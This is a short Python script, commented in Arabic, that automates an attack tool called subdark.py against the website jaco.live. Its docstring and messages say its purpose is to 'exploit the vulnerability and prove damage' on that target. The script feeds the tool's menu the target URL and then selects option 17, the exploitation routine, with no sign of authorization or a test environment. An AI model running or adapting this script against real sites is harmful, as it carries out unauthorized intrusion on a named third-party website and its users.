#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
برنامج لاستغلال الثغرة وإثبات الضرر على الهدف jaco.live
"""

import subprocess
import sys
import time

def run_subdark_exploit():
    """تشغيل أداة SubDark لاستغلال الثغرة وإثبات الضرر"""
    
    # تشغيل أداة SubDark
    process = subprocess.Popen(
        [sys.executable, "subdark.py"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # الانتظار قليلاً لظهور القائمة
    time.sleep(3)
    
    # إدخال الهدف أولاً (الخيار 1)
    process.stdin.write("1\n")
    process.stdin.flush()
    time.sleep(1)
    
    # إدخال الهدف https://jaco.live
    process.stdin.write("https://jaco.live\n")
    process.stdin.flush()
    time.sleep(2)
    
    # اختيار استغلال الثغرة وإثبات الضرر (الخيار 17)
    process.stdin.write("17\n")
    process.stdin.flush()
    time.sleep(2)
    
    # إغلاق عملية الإدخال
    process.stdin.close()
    
    # قراءة المخرجات
    stdout, stderr = process.communicate()
    
    print("نتائج استغلال الثغرة:")
    print(stdout)
    
    if stderr:
        print("أخطاء:")
        print(stderr)
    
    return process.returncode

if __name__ == "__main__":
    print("بدء استغلال الثغرة على الهدف https://jaco.live...")
    result = run_subdark_exploit()
    print(f"تم الانتهاء برمز خروج: {result}")